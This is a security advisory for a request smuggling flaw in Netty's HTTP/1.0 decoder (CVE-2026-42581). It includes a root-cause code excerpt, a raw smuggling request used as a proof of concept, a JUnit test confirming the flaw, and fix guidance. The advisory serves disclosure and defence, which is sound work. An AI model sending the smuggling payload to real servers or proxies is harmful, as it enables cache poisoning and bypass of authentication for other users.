# [M] Netty HTTP/1.0 TE+CL Coexistence Bypasses Smuggling Sanitization

## Summary
Severity: Medium
Advisory: GHSA-xxqh-mfjm-7mv9
CVE: CVE-2026-42581
CWE: CWE-444
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-xxqh-mfjm-7mv9
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-http` — affected >=4.2.0.Alpha1 <4.2.13.Final
- Maven: `io.netty:netty-codec-http` — affected >=0 <4.1.133.Final

## Details
# NETTY HTTP/1.0 TE+CL Coexistence Bypasses Smuggling Sanitization

| Field     | Value |
|-----------|-------|
| Library   | `io.netty:netty-codec-http` |
| Component | `codec-http` — `HttpObjectDecoder` |
| Severity  | **HIGH** |
| Affects   | HEAD, commit `4f3533ae` confirmed |

---

## Summary

`HttpObjectDecoder` strips a conflicting `Content-Length` header when a request carries both `Transfer-Encoding: chunked` and `Content-Length`, but only for HTTP/1.1 messages. The guard is absent for HTTP/1.0. An attacker that sends an HTTP/1.0 request with both headers causes Netty to decode the body as chunked while leaving `Content-Length` intact in the forwarded `HttpMessage`. Any downstream proxy or handler that trusts `Content-Length` over `Transfer-Encoding` will disagree on message boundaries, enabling request smuggling.

---

## Root Cause

```java
// HttpObjectDecoder.java:828-833
if (HttpUtil.isTransferEncodingChunked(message)) {
    this.chunked = true;
    if (!contentLengthFields.isEmpty() && message.protocolVersion() == HttpVersion.HTTP_1_1) {
        handleTransferEncodingChunkedWithContentLength(message);  // strips CL — HTTP/1.1 only
    }
    return State.READ_CHUNK_SIZE;
}

// HttpObjectDecoder.java:870-873
protected void handleTransferEncodingChunkedWithContentLength(HttpMessage message) {
    message.headers().remove(HttpHeaderNames.CONTENT_LENGTH);
    contentLength = Long.MIN_VALUE;
}
```

The conflict-resolution path is gated on `message.protocolVersion() == HttpVersion.HTTP_1_1`. When the request declares `HTTP/1.0`, the condition is false, `handleTransferEncodingChunkedWithContentLength` is never called, and the `Content-Length` header survives into the forwarded message. Netty still processes the body as chunked; a downstream component that is CL-first interprets the same bytes as a separate request.

---

## Proof of Concept

```
POST /api HTTP/1.0\r\n
Host: internal.example.com\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 0\r\n
\r\n
5\r\n
GPOST\r\n
0\r\n
\r\n
```

Netty consumes the full chunked body (5 bytes + terminator). A downstream CL-first proxy reads `Content-Length: 0`, considers the request complete at the blank line, and treats `5\r\nGPOST\r\n0\r\n\r\n` as the start of a second request.

---

## Conditions Required

1. Netty is deployed behind a reverse proxy or load balancer that is `Content-Length`-first (nginx, some HAProxy configs, AWS ALB in certain modes).
2. Attacker can send HTTP/1.0 requests (either directly or by downgrading via connection manipulation).
3. No additional HTTP/1.0 stripping layer between attacker and Netty.

---

## Impact

Request smuggling at the Netty edge. Allows cache poisoning, session fixation against other users, unauthorized access to internal endpoints, and bypassing of WAF or authentication layers that inspect only the first logical request.

---

## Confirmed PoC Test

Verified against HEAD (`4f3533ae`) using `EmbeddedChannel`. Both tests pass, confirming the vulnerability and the HTTP/1.1 contrast.

```java
package io.netty.handler.codec.http;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.util.CharsetUtil;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

public class NettySmugglingSec001Test {

    // VULNERABLE: Content-Length survives in HTTP/1.0 TE+CL conflict
    @Test
    public void http10_contentLengthNotStripped() {
        EmbeddedChannel ch = new EmbeddedChannel(new HttpRequestDecoder());
        ch.writeInbound(Unpooled.copiedBuffer(
                "POST /api HTTP/1.0\r\n" +
                "Transfer-Encoding: chunked\r\n" +
                "Content-Length: 0\r\n" +
                "\r\n" +
                "5\r\nGPOST\r\n0\r\n\r\n", CharsetUtil.US_ASCII));

        HttpRequest req = ch.readInbound();
        assertEquals(HttpVersion.HTTP_1_0, req.protocolVersion());
        // Content-Length: 0 survives — downstream CL-first proxy treats chunked body as new request
        assertNotNull(req.headers().get(HttpHeaderNames.CONTENT_LENGTH), "VULNERABLE: CL not stripped");
        ch.finishAndReleaseAll();
    }

    // SAFE: HTTP/1.1 correctly strips Content-Length on TE+CL conflict
    @Test
    public void http11_contentLengthStripped() {
        EmbeddedChannel ch = new EmbeddedChannel(new HttpRequestDecoder());
        ch.writeInbound(Unpooled.copiedBuffer(
                "POST /api HTTP/1.1\r\n" +
                "Transfer-Encoding: chunked\r\n" +
                "Content-Length: 0\r\n" +
                "\r\n" +
                "5\r\nGPOST\r\n0\r\n\r\n", CharsetUtil.US_ASCII));

        HttpRequest req = ch.readInbound();
        assertNull(req.headers().get(HttpHeaderNames.CONTENT_LENGTH), "SAFE: CL correctly stripped");
        ch.finishAndReleaseAll();
    }
}
```

---

## Fix Guidance

Remove the `message.protocolVersion() == HttpVersion.HTTP_1_1` guard in `HttpObjectDecoder`, applying `handleTransferEncodingChunkedWithContentLength` unconditionally whenever both `Transfer-Encoding: chunked` and `Content-Length` are present, regardless of protocol version.

## References
- https://github.com/netty/netty/security/advisories/GHSA-xxqh-mfjm-7mv9
- https://nvd.nist.gov/vuln/detail/CVE-2026-42581
- https://github.com/netty/netty
